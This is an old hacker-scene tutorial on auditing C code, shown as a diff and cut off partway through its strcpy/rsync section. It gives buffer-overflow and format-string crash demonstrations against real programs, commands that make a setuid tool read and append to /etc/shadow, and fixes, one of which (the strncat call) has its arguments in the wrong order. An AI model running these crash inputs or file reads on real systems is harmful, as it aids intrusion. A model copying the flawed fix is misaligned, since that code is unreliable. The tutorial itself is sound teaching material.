@@ -1,0 +1,1343 @@
+============================================================================================================================
+
+                                             Code Auditing in C
+                                    By: Tal0n [cyber_talon@hotmail.com]
+                                           08-20-04 thru 08-24-04
+
+============================================================================================================================
+
+1. Introduction
+2. Getting Started
+3. Tools
+4. Our First Vulnerable Code
+5. Vulnerable Examples
+5.1 fopen()
+5.2 fprintf()
+5.3 getenv()
+5.4 printf()
+5.5 scanf()
+5.6 sprintf()
+5.7 strcat()
+5.8 strcpy()
+5.9 syslog()
+5.10 system()
+5.11 Integer Overflows
+5.12 Double free() Bugs
+5.13 Off-by-One Bugs
+6. Unvulnerable Examples
+6.1 Example #1
+6.2 Example #2
+6.3 Example #3
+7. Preventing Flaws Checklist
+8. References
+9. Greets and Links
+10. Conclusion
+
+============================================================================================================================
+
+1. Code auditing can be a slow and daunting task, but in practice and pace, it can be very rewarding. One of the 
+reasons I am writing this text is because i've never seen a text that really explains and tells about the things I 
+hope to tell and show in this text. I also would like to see more code auditing but BugTraq lacks that =/. I think it 
+may be ok to post a advisory every now and then, maybe, but organizations like eEye and iDEFENSE and some others are 
+just plain wrong for posting as much as they do. As said in "Hacker's Manifesto", "whitehats. you know not what you do", 
+and that is very true. I am not a code audit expert, nor do I claim to be, so don't get the wrong impression about me 
+or this text. I hope for this to turn out to be a good one and people learn much for it and pass the information on. 
+If you don't like what I say or how I say things in this text, thats your problem. I wrote this text to help educate 
+the public about code auditing in C, not to please everyone.
+
+============================================================================================================================
+
+2. Getting started, you need or should have the following handy:
+
+A *nix box --> You need one of these to survive =).
+GCC --> To compile things with gcc.
+GDB --> Used for debugging shizzle.
+Some software to audit --> Check sourceforge.net, gnu.org, the usual hehe.
+A Brain --> You can use your own or you might find one on Ebay pretty cheap =X.
+Knowledge of ASM --> Would help you in understanding some debugging procedures.
+Knowledge of C --> Will definatly help with the auding and coding, hehe.
+This Text --> Kinda hard to have this handy since you are kinda reading it =p.
+
+============================================================================================================================
+
+3. Ok, now for some auditing tools that may help us.
+
+1. /usr/bin/vuln --> A simple shell script written by me, the only script i use to audit =)
+
+Source:
+
+<vuln>
+
+echo ""
+echo "Tal0n's 'vuln' Audit Script"
+echo "By: Tal0n cyber_talon@hotmail.com"
+echo ""
+rm -rf *.log
+echo "Looking for possible vulnerable functions..."
+echo ""
+grep "strcpy" *.c | cat >> strcpy.log
+grep "strcpy" *.cpp | cat >> strcpy.log
+grep "syslog" *.c | cat >> syslog.log
+grep "syslog" *.cpp | cat >> syslog.log
+grep "sprintf" *.c | cat >> sprintf.log
+grep "sprintf" *.cpp | cat >> sprintf.log
+grep "fprintf" *.c | cat >> fprintf.log
+grep "fprintf" *.cpp | cat >> fprintf.log
+grep "strcat" *.c | cat >> strcat.log
+grep "strcat" *.cpp | cat >> strcat.log
+grep "getenv" *.c | cat >> getenv.log
+grep "getenv" *.cpp | cat >> getenv.log
+chmod 644 *.log
+ls -al *.log
+echo ""
+echo "Finished! Please Check Logs."
+echo ""
+
+</vuln>
+
+2. Flawfinder --> A popular tool that i've found abit too messy.. and i'd rather not use.. but still seems to do its job ok.
+
+http://www.dwheeler.com/flawfinder/flawfinder-1.26.tar.gz --> tarball
+http://www.dwheeler.com/flawfinder/flawfinder-1.26-1.noarch.rpm --> noarch binary
+http://www.dwheeler.com/flawfinder/flawfinder-1.26-1.src.rpm --> src rpm
+http://www.dwheeler.com/flawfinder/flawfinder --> src code
+
+3. RATS --> Another popular tool used to audit c, c++, perl, php, python, etc, but i've actually never used it.. heh. Seems
+to do pretty well from what i've heard from others though.
+
+http://www.securesw.com/rats/rats-2.1.tar.gz --> tarball
+http://umn.dl.sourceforge.net/sourceforge/expat/expat-1.95.8.tar.gz --> xml parser, RAT requires it.
+http://www.securesw.com/rats/rats-2.1-win32.zip --> windows
+http://umn.dl.sourceforge.net/sourceforge/expat/expat_win32bin_1_95_8.exe --> windows installer
+
+4. Clint --> Another one i've never used and found on sourceforge.. supposedly audits c++ and python, may be something to
+look at and use, etc.
+
+http://umn.dl.sourceforge.net/sourceforge/clint/clint-0.1.2.tar.gz
+
+I'm sure there are probably more tools out there.. I just tried to mention a few. Check Google or SourceForge =).
+
+============================================================================================================================
+
+4. Well here goes.. our first vulnerable code.. and ain't it a mighty vulnerable one? or is it? =)
+
+talon@quake:~/audit$ cat program.c
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+
+char buffer[128]; // --> Buffer Size
+
+sprintf(buffer, argv[1]); // --> Buffer Overflow (and possible format string flaw.. hehe)
+
+printf("\n");
+printf(buffer); // --> Format String Flaw
+printf("\n\n");
+
+return 0;
+}
+talon@quake:~/audit$ vuln
+
+Tal0n's 'vuln' Audit Script
+By: Tal0n cyber_talon@hotmail.com
+
+Looking for possible vulnerable functions...
+
+grep: *.cpp: No such file or directory
+grep: *.cpp: No such file or directory
+grep: *.cpp: No such file or directory
+grep: *.cpp: No such file or directory
+grep: *.cpp: No such file or directory
+grep: *.cpp: No such file or directory
+-rw-r--r--  1 talon reflux  0 2004-08-20 14:57 fprintf.log
+-rw-r--r--  1 talon reflux  0 2004-08-20 14:57 getenv.log
+-rw-r--r--  1 talon reflux 26 2004-08-20 14:57 sprintf.log
+-rw-r--r--  1 talon reflux  0 2004-08-20 14:57 strcat.log
+-rw-r--r--  1 talon reflux  0 2004-08-20 14:57 strcpy.log
+-rw-r--r--  1 talon reflux  0 2004-08-20 14:57 syslog.log
+
+Finished! Please Check Logs.
+
+talon@quake:~/audit$ cat sprintf.log
+sprintf(buffer, argv[1]);
+talon@quake:~/audit$ grep printf program.c
+sprintf(buffer, argv[1]);
+printf("\n");
+printf(buffer);
+printf("\n\n");
+talon@quake:~/audit$ pico program.c // --> We check into it closer... =)
+talon@quake:~/audit$ echo "vulnerable =)"
+vulnerable =)
+talon@quake:~/audit$ ./program `perl -e 'print "A" x 150'` // --> Overflow the Buffer
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Segmentation fault (core dumped) // --> Seg Fault =)
+talon@quake:~/audit$ gdb -c core
+GNU gdb 6.1.1
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-slackware-linux".
+Core was generated by `./program AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? () // --> Overwritten EIP Register
+(gdb) q
+talon@quake:~/audit$ ./program "0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x" // --> Trigger Format String Flaw
+
+0xbffff584 0xbffff4e4 0x66627830 0x35666666 0x30203438 0x66666278 0x65346666 0x78302034 0x32363636 0x30333837 // --> =D
+
+talon@quake:~/audit$
+
+So that just about covers the first vulnerable code.. hehe.
+
+============================================================================================================================
+
+5. This section is full of examples of vulnerable code and fixes, read this well =D.
+
+============================================================================================================================
+
+5.1 fopen() is a file stream function. Its used for opening a file for writing, reading, appending, etc. But, without proper
+checks, it can become a hazard to software its used in.
+
+We will use a real example, PortMon 1.7 (Advisory: http://securitytracker.com/alerts/2003/Jun/1007010.html).
+
+talon@quake:~/audit/portmon-1.7$ portmon -c /etc/shadow
+Unable to resolve hostname root:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:12632:0:::::
+Unable to resolve hostname bin:*:9797:0:::::
+Unable to resolve hostname nobody:*:9797:0:::::
+Unable to resolve hostname talon:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:12642:0:99999:7:::
+Unable to resolve hostname syslog:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:12633:0:99999:7:::
+talon@quake:~/audit/portmon-1.7$
+
+As you can see, portman tried to read /etc/shadow as the config file, and started spewing it out in stdout.
+
+Finally, here is some of the code that caused our problem.
+
+int
+read_config (char *config_fname)
+{
+  FILE *fd;
+  char *fline = (char *) malloc (256 * sizeof (char));
+  char *tmp = (char *) malloc (64 * sizeof (char));
+  int host_num = 0, i, j, k, digit_state = 0;
+  struct hostent *host = NULL;
+
+  if ((fd = fopen (config_fname, "r")) == NULL) // --> Lets just open ANY config file specified... =/
+    {
+      perror ("fopen");
+      return (-1);
+    }
+
+.....
+
+if (isspace (fline[i]))
+            {
+              strncpy (tmp, fline, i); // --> Copy the file's lines into tmp :X
+              // lookup the hostname
+              // if the string is an IP addy, it will just put that there
+              if ((host = gethostbyname (tmp)) == NULL)
+                {
+                  fprintf (stderr, "Unable to resolve hostname %s\n", tmp); // --> SPEWING OUT TEH GOODS! x|
+                  k = 1;
+                  break;
+                }
+
+There is also another fopen() vulnerability in PortMon allowing users to write to files.
+
+Now how can we fix that? I can think of a few ways...
+
+1. Don't allow portmon to be suid root at all.
+2. Chroot portmon to a specific directory so it can only read the config file there.
+3. Don't spew out the information like that or use another standard error message.
+4. Implement code to check and see if the current uid has permission to access files like so.
+5. Use a hard coded config file in portmon or only allow config files from certain directories or reading permissions.
+
+talon@quake:~/audit/portmon-1.7$ portmon -l /etc/shadow
+fopen: No such file or directory
+Failed reading config file hosts
+talon@quake:~/audit/portmon-1.7$ su
+Password:
+root@quake:/home/talon/audit/portmon-1.7# cat /etc/shadow
+root:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:12632:0:::::
+bin:*:9797:0:::::
+nobody:*:9797:0:::::
+talon:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:12642:0:99999:7:::
+syslog:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:12633:0:99999:7:::
+(Fri Aug 20 13:39:36 2004) - Portmon started by user talon
+root@quake:/home/talon/audit/portmon-1.7# exit
+exit
+talon@quake:~/audit/portmon-1.7$
+
+As you can see the -l option let PortMon log to a file, as it did, /etc/shadow.
+
+Teh code:
+
+int
+log_write (char *msg)
+{
+  FILE *log_fp;
+  if ((log_fp = fopen (logfile, "a")) == NULL) // --> Lets just open ANY file specified to append to.. =/
+    {
+      perror ("fopen");
+      return (1);
+    }
+  fprintf (log_fp, "(%s) - %s", get_time (time (NULL)), err_msg); // --> AND WRITE TO IT AS WELL!!! =p
+  fclose (log_fp);
+  return (0);
+}
+
+Fixes?
+
+Mostly the same as the first fixes.. but verify the log files/directories instead of the config files.
+
+============================================================================================================================
+
+5.2 fprintf() is another file stream function. It prints data to a file stream, whether it be to a file or stdout, or etc.
+Without proper formatting.. fprintf() can cause lots of pain in the format string category.
+
+Our example for fprintf is... TrACESroute (NANOG) (Advisory: http://securitytracker.com/alerts/2002/Jun/1004481.html)
+
+talon@quake:~/audit/traceroute-nanog-6.0.orig$ ./traceroute -T 0x%x localhost
+traceroute to localhost (127.0.0.1), 30 hops max, 40 byte packets0x%x 1  * * *0xbffff4a8 2  * * *0xbffff4a8 3  * * *0xbffff4a8
+4  * * *0xbffff4a8 5  * * *0xbffff4a8 6  * * *0xbffff4a8 7  * * *0xbffff4a8 8  * * *0xbffff4a8 9  * * *0xbffff4a810  * * 
+*0xbffff4a811  * * *0xbffff4a812  * * *0xbffff4a813  * * *0xbffff4a814  * * *0xbffff4a815  * * *0xbffff4a816  * * *0xbffff4a817
+  * * *0xbffff4a818  * * *0xbffff4a819  * * *0xbffff4a820  * * *0xbffff4a821  * * *0xbffff4a822  * * *0xbffff4a823  * * 
+*0xbffff4a824  * * *0xbffff4a825  * * *0xbffff4a826  * * *0xbffff4a827  * * *0xbffff4a828  * * *0xbffff4a829  * * *0xbffff4a830
+  * * *0xbffff4a8talon@quake:~/audit/traceroute-nanog-6.0.orig$
+
+Wow. Format String City eh? =D
+
+Vulnerable Code:
+
+if (pploss) {
+            if (lost < probe) {
+               throughput = ( 100.0 - ( ( lost * 100.0 ) / probe ));
+               Fprintf(stdout,
+                       "  (%1.1f ms/%1.1f ms(+-%1.1f ms)/%1.1f ms)",
+                       min, (sum / (probe - lost)),
+                       (float)sqrt((double)sumsq)/(probe-lost), max);
+               Fprintf(stdout," %d/%d (%#3.2f%%)", (probe - lost), // --> This is teh first output.
+                       probe, throughput);
+               (void) fflush(stdout);
+            }
+         }
+         Fprintf(stdout,terminator); // --> NOW HERE COMES OUR FORMAT STRING! =)
+
+Do I hear any fixes...? Yep =).
+
+1. Use checking of input by the user.
+2. Use proper fprintf() syntax's in code like so:
+
+NOT: fprintf(stdout, terminator);
+
+USE: fprintf(stdout, "%s", terminator);
+
+3. Just follow 2 and you'll be fine =p.
+
+============================================================================================================================
+
+5.3 getenv() is a environmental function. It is used to get the data from a environmental varible. Now itself.. its not
+really a harzard, but when used with a data copying function.. it can be harmful.
+
+And getenv()'s example is... Liquid War 5.4.5 (Advisory: http://securitytracker.com/alerts/2003/Sep/1007713.html).
+
+talon@quake:~/audit/liquidwar-5.4.5$ perl -e 'print "A" x 550' // --> Lets get teh shizzle
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtalon@quake:~/audit/liquidwar-5.4.5$
+talon@quake:~/audit/liquidwar-5.4.5$ export HOME=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA // --> Setting "HOME" to teh shizzle
+talon@quake:/home/talon/audit/liquidwar-5.4.5$ liquidwar // --> Executing LiquidWar
+Segmentation fault (core dumped) // --> BOOM! Seg Fault =)
+talon@quake:/home/talon/audit/liquidwar-5.4.5$ gdb -c core // --> Lets Debug Abit
+GNU gdb 6.1.1
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-slackware-linux".
+Core was generated by `liquidwar'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? () // --> Overwritten EIP Register =D
+(gdb) q
+talon@quake:/home/talon/audit/liquidwar-5.4.5$
+
+Teh BAD Code:
+
+static void set_path (void)
+{
+ char home_path[512]; // --> 512
+ char *home_env;
+
+ if (exist_argument_value (IDENT_CFG))
+     strcpy(STARTUP_CFG_PATH,get_argument_str (IDENT_CFG));
+ else
+    {
+    #ifdef ALLEGRO_UNIX // --> Are we UNIX OS? WE BETTER BE! =)
+         home_env=getenv("HOME"); // --> home_env equals getenv("HOME");
+         strcpy(home_path,home_env); // --> strcpy COPIES home_env("HOME") INTO home_path!!!
+         strcat(home_path,"/");
+    #else
+         home_env="";
+         strcpy(home_path,home_env); // --> As you can see this one isn't vulnerable.. heh.
+    #endif
+     strcpy(STARTUP_CFG_PATH,home_path); // --> Ya, ya another one.. but the first one is enough for this text hehe.
+     strcat(STARTUP_CFG_PATH,DEFAULT_CFG_PATH); // --> This one is vuln.. but we aren't going to talk bout it yet =p.
+    }
+
+Do we got any fixes laying around here? YEP!!! =)
+
+1. Check the size of getenv("HOME") before copying it.
+2. Use the safer function strncpy(), not strcpy() (We will talk about this later =p).
+3. Don't use environmetal varibles or strcpy() (=/).
+
+============================================================================================================================
+
+5.4 printf() is a format printing function, it prints output basically. printf() used without proper formmatting cause cause
+some mighty bad format string vulnerabilities.
+
+And now our next software... LCDProc 0.4.1 (Advisory: http://www.priv8security.com/adv/lcdproc.adv2).
+
+Server-Side View:
+talon@quake:~/audit/lcdproc-0.4.1/server$ ./LCDd -d MtxOrb "--device /dev/lcd --contrast 200" -d joy // --> Start the server
+MtxOrb_init: failed (No such file or directory)
+Error loading driver MtxOrb.  Continuing anyway...
+Error loading driver joy.  Continuing anyway...
+talon@quake:~/audit/lcdproc-0.4.1/server$
+
+Client-Side View:
+talon@quake:~$ telnet localhost 13666 // --> Connect to the server
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+hello // --> Say hi to teh daemon
+connect LCDproc 0.4.1 protocol 0.3 lcd wid 20 hgt 4 cellwid 5 cellhgt 8
+test_func // --> Just Testing.. =)
+test_func_func:  0 -> test_func
+test_func 0x%x 0x%x 0x%x 0x%x 0x%x // --> Now we trigger teh flawz =D
+test_func_func:  0 -> test_func
+test_func_func:  1 -> 0x%x
+test_func_func:  2 -> 0x%x
+test_func_func:  3 -> 0x%x
+test_func_func:  4 -> 0x%x
+test_func_func:  5 -> 0x%x
+Terminated (I "killall telnet"'d in another term, hehe.)
+talon@quake:~$
+
+Server-Side View:
+talon@quake:~/audit/lcdproc-0.4.1/server$ test_func_func:  0 -> test_func
+test_func_func:  0 -> test_func
+test_func_func:  1 -> 0x8058a38 // --> WHATS THAT??? A MEMORY REGISTER IN TEH OUTPUT?? =)
+test_func_func:  2 -> 0x8058a38
+test_func_func:  3 -> 0x8058a38
+test_func_func:  4 -> 0x8058a38
+test_func_func:  5 -> 0x8058a38
+(I press enter)
+talon@quake:~/audit/lcdproc-0.4.1/server$
+
+As you can see.. the format string flaw prevailed well in the server =p.
+
+Now for the code:
+
+int
+test_func_func (client * c, int argc, char **argv)
+{
+        int i;
+        char str[256];
+
+        for (i = 0; i < argc; i++) {
+                sprintf (str, "test_func_func:  %i -> %s\n", i, argv[i]); --> another flaw we not talk about yet hehe
+                printf (str); --> Using printf() WITHOUT PROPER FORMATTING!? CRAZY PROGRAMMERZ!!! =)
+                sock_send_string (c->sock, str);
+        }
+        return 0;
+}
+
+Do i hear any fixes??? Yes Sir =D.
+
+1. Filter Input.
+2. Fix formatting:
+
+NOT: printf (str);
+
+USE: printf ("%s", str);
+
+3. Don't print debug info to screen.
+
+============================================================================================================================
+
+5.5 scanf() is an input function. It basically takes in data and stores it in a varible. Hopefully you can see the vulnerability
+here.. hehe.
+
+Our example here is.. scanf.c (I couldn't find a good real example so I had to write one hehe).
+
+talon@quake:~/audit$ perl -e 'print "A" x 80' // --> Get Overflow Data
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtalon@quake:~/audit$
+talon@quake:~/audit$ ./scanf
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA // --> OVERFLOW IT!
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Segmentation fault (core dumped) // --> SegFault =D
+talon@quake:~/audit$ gdb -c core
+GNU gdb 6.1.1
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-slackware-linux".
+Core was generated by `./scanf'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? () Overwritten EIP Register Once Again hehe
+(gdb) q
+talon@quake:~/audit$
+
+And now the code that caused it all:
+
+char buffer[64]; // --> 64
+
+printf("\n");
+scanf("%s", &buffer); // --> Take in the buffer no matter how large it is!!!
+printf("\n%s\n\n", buffer);
+
+Fixes? Hehehe:
+
+1. Don't use scanf().. its out-of-date and considered usually unsafe in general.
+2. Validate the size of the input.
+3. 1 is the easiest and usually best choice, hehe.
+
+============================================================================================================================
+
+5.6 sprintf() is a function used to format text and take data and put it into another varible. The flaw here once again is
+if the varible(s) being formatted into the other one is/are too big.. an overflow will usually occur. Or, if the programmer
+does not use proper formatting, a format string flaw may come to view.
+
+Our lucky example is... 0verkill (Advisory: http://www.derkeiler.com/Mailing-Lists/Securiteam/2004-02/0001.html).
+
+talon@quake:~/audit/0verkill-0.15$ perl -e 'print "A" x 300' // --> We make our overflow A's
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtalon@quake:~/audit/0verkill-0.15$
+talon@quake:~/audit/0verkill-0.15$ export // --> Lets put'em into the environment HOME=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+talon@quake:/home/talon/audit/0verkill-0.15$ ./0verkill // --> Execute 0verkill
+Segmentation fault (core dumped) // --> SegFault? =)
+talon@quake:/home/talon/audit/0verkill-0.15$ gdb -c core
+GNU gdb 6.1.1
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-slackware-linux".
+Core was generated by `./0verkill'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? () Overwritten EIP Register. YAY! =)
+(gdb) q
+talon@quake:/home/talon/audit/0verkill-0.15$
+
+Now.. the way this one is setup is that it's sprintf()'in "HOME" into a varible less than 300 bytes.
+
+Code:
+
+/* load configure file from player's home directory */
+void load_cfg(char *host,char *name,int *color)
+{
+        FILE *stream;
+        int a;
+        unsigned char txt[256]; // --> 256
+
+#ifndef WIN32
+        sprintf(txt,"%s/%s",getenv("HOME"),CFG_FILE); // --> Putting getenv("HOME") and CFG_FILE into txt (256)!
+#else
+        sprintf(txt,"./%s",CFG_FILE); // --> Maybe another overflow, didnt check. heh.
+#endif
+
+Time for Fixes? Yeah!
+
+1. Check size of "HOME" varible.
+2. Use proper bounds checking:
+
+NOT: sprintf(txt,"%s/%s",getenv("HOME"),CFG_FILE);
+
+USE: snprintf(txt, sizeof(txt), "%s/%s",getenv("HOME"),CFG_FILE);
+
+3. Use 2 and you should be fine =).
+
+============================================================================================================================
+
+5.7 strcat() is string function that concatenate's two strings, meaning, correct me if i'm wrong.. take one string and append
+it onto the other, heh. I don't know too much about this function because I rarely use it.. but I know it can be vulnerable
+at times.. hehe.
+
+And our handy dandy example is.. strcat.c, since I can't seem to locate a suitable real example =/.
+
+talon@quake:~/audit$ ./strcat `perl -e 'print "A" x 200'` // --> Our shizzle
+
+°ôÿ¿O@Ò}@à
+@P@T@õÿ¿dôÿ¿¤AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Segmentation fault (core dumped) // --> Wow. Another SegFault. Hehe.
+talon@quake:~/audit$ gdb -c core
+GNU gdb 6.1.1
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-slackware-linux".
+Core was generated by `./strcat AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? () // --> And ANOTHER Overwritten EIP Register =)
+(gdb) q
+talon@quake:~/audit$
+
+Now all we did was overflow argv[1] into another varible basically, heh.
+
+Shizzle Code:
+
+char buffer[150]; // --> 150
+strcat(buffer, argv[1]); // --> Copying argv[1] into buffer!?? Yep =X.
+
+Fixes Anyone? =):
+
+1. Limit size of data in argv[1].
+2. Limit the maximum size of the buffer.
+3. Use bounds checking with strncat() not strcat():
+
+NOT:
+
+strcat(buffer, argv[1]);
+
+USE: strncat(buffer, sizeof(buffer), argv[1]);
+
+============================================================================================================================
+
+5.8 strcpy() is a string function used to copy one piece of data into another. strcpy() is probably the world's most vulnerable
+and exploited function in the C programming language.
+
+Ya ya ya.. strcpy()'s example is... Rsync 2.5.7 (Advisory: http://www.securiteam.com/unixfocus/5IP0C0AC0Y.html).
+
+talon@quake:~/audit/rsync-2.5.7$ export RSYNC_PROXY=`perl -e 'print "A" x 20,":","A" x 1050'`
+talon@quake:~/audit/rsync-2.5.7$ ./rsync localhost::rsync
+Segmentation fault (core dumped)
+talon@quake:~/audit/rsync-2.5.7$ gdb -c core
+GNU gdb 6.1.1
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-slackware-linux".
+Core was generated by `AAAAAAAAAAAAAAAAAAAAAAAAA'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x4006efc0 in ?? ()
+(gdb) bt
+#0  0x4006efc0 in ?? ()
+#1  0x40165f1a in ?? ()
+#2  0x400473d0 in ?? ()
+#3  0x40015930 in ?? ()
+#4  0x00000005 in ?? ()
+#5  0x40015be8 in ?? ()
+#6  0x0000414c in ?? ()
+#7  0x00000006 in ?? ()
+#8  0x4016f60c in ?? ()
+#9  0x00000005 in ?? ()
+#10 0x00000005 in ?? ()
+
+.....
+
+#89 0x41414141 in ?? () // --> Overwritten Registers =p
+#90 0x41414141 in ?? ()
+#91 0x41414141 in ?? ()
+#92 0x41414141 in ?? ()
+#93 0x41414141 in ?? ()
+#94 0x41414100 in ?? ()
+#95 0x41414141 in ?? ()
+#96 0x41414141 in ?? ()
+#97 0x41414141 in ?? ()
+#98 0x41414141 in ?? ()
+#99 0x41414141 in ?? ()
+
+.....
+
+(gdb) q
+talon@quake:~/audit/rsync-2.5.7$
+
+And the code:
+
+int open_socket_out(char *host, int port, const char *bind_address,
+                    int af_hint)
+{
+        int type = SOCK_STREAM;
+        int error;
+        int s;
+        struct addrinfo hints, *res0, *res;
+        char portbuf[10]; // --> 10
+        char *h;
+        int proxied = 0;
+        char buffer[1024]; // --> 1024
+        char *cp;
+
+        /* if we have a RSYNC_PROXY env variable then redirect our
+         * connetcion via a web proxy at the given address. The format
+         * is hostname:port */
+        h = getenv("RSYNC_PROXY"); // --> h quals getenv("RSYNC_PROXY")
+        proxied = (h != NULL) && (*h != '\0');
+
+        if (proxied) {
+                strlcpy(buffer, h, sizeof(buffer)); // --> Copy h into buffer
+                cp = strchr(buffer, ':'); // cp equals find : in buffer
+                if (cp == NULL) {
+                        rprintf(FERROR,
+                                "invalid proxy specification: should be HOST:PORT\n");
+                        return -1;
+                }
+                *cp++ = '\0';
